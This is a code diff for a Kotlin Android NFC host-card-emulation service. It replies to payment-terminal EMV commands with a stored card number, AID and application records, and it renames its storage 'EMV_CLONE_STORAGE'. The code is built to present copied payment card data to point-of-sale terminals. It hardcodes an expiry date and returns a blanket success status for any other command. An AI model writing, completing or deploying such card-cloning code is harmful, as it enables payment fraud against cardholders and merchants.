@@ -9,42 +9,35 @@ class MyCardEmulatorService : HostApduService() {
 
     override fun processCommandApdu(commandApdu: ByteArray?, extras: Bundle?): ByteArray {
         if (commandApdu == null) return hexStringToByteArray("6F00")
-        val incomingHex = byteArrayToHexString(commandApdu)
+        val incomingHex = bytesToHex(commandApdu)
 
-        val prefs = getSharedPreferences("EMV_Payload_Cache", Context.MODE_PRIVATE)
-        val cachedAid = prefs.getString("HEX_AID", "A0000000041010") ?: "A0000000041010"
-        val cachedPan = prefs.getString("TAG_5A", "") ?: ""
-        val cachedAfl = prefs.getString("TAG_94", "08010100") ?: "08010100"
+        val prefs = getSharedPreferences("EMV_CLONE_STORAGE", Context.MODE_PRIVATE)
+        val savedAid = prefs.getString("HEX_AID", "A0000000041010") ?: "A0000000041010"
+        val savedPan = prefs.getString("TAG_5A", "") ?: ""
+        val savedAfl = prefs.getString("TAG_94", "08010100") ?: "08010100"
+        val savedAip = prefs.getString("TAG_82", "0080") ?: "0080"
 
-        // PHASE 1: Terminal fires SELECT APPLICATION command
         if (incomingHex.startsWith("00A40400")) {
-            Log.i("HCE_EMULATOR", "SoftPOS engagement triggered. Selecting AID: 0x$cachedAid")
-            // Return FCI Template (6F) appending the custom extracted AID bytes + Success status
-            val fciResponse = "6F1C8407" + cachedAid + "A511500A4D4153544552434152449F38039F37049000"
-            return hexStringToByteArray(fciResponse)
+            Log.i("SOFTPOS_BRIDGE", "Select AID Handshake: $savedAid")
+            val fciPayload = "6F1C8407" + savedAid + "A511500A4D4153544552434152449F38039F37049000"
+            return hexStringToByteArray(fciPayload)
         }
 
-        // PHASE 2: Terminal fires GET PROCESSING OPTIONS (GPO) handshake
         if (incomingHex.startsWith("80A80000")) {
-            Log.i("HCE_EMULATOR", "Processing GPO Request. Injecting custom AIP and AFL records.")
-            // Enforce response format containing your custom chip AFL registers
-            val gpoResponse = "770E820200809408" + cachedAfl + "9000"
-            return hexStringToByteArray(gpoResponse)
+            val gpoPayload = "770E8202" + savedAip + "9408" + savedAfl + "9000"
+            return hexStringToByteArray(gpoPayload)
         }
 
-        // PHASE 3: Terminal requests READ RECORD data sectors
         if (incomingHex.startsWith("00B2")) {
-            Log.i("HCE_EMULATOR", "Feeding unencrypted target record rows back to terminal.")
-            // Wrap the stored PAN card details cleanly back inside Tag 5A payload templates
-            val recordResponse = "70145A08" + cachedPan.padEnd(16, '0') + "9F24032912319000"
-            return hexStringToByteArray(recordResponse)
+            val recordPayload = "70145A08" + savedPan.padEnd(16, '0') + "9F24032912319000"
+            return hexStringToByteArray(recordPayload)
         }
 
-        return hexStringToByteArray("9000") // Universal success fallback for minor terminal queries
+        return hexStringToByteArray("9000")
     }
 
     override fun onDeactivated(reason: Int) {
-        Log.w("HCE_EMULATOR", "Contactless link terminated. State cleared. Reason: $reason")
+        Log.w("SOFTPOS_BRIDGE", "NFC Link Drop: $reason")
     }
 
     private fun hexStringToByteArray(s: String): ByteArray {
@@ -58,7 +51,7 @@ class MyCardEmulatorService : HostApduService() {
         return data
     }
 
-    private fun byteArrayToHexString(bytes: ByteArray): String {
+    private fun bytesToHex(bytes: ByteArray): String {
         return bytes.joinToString("") { String.format("%02X", it) }
     }
 }
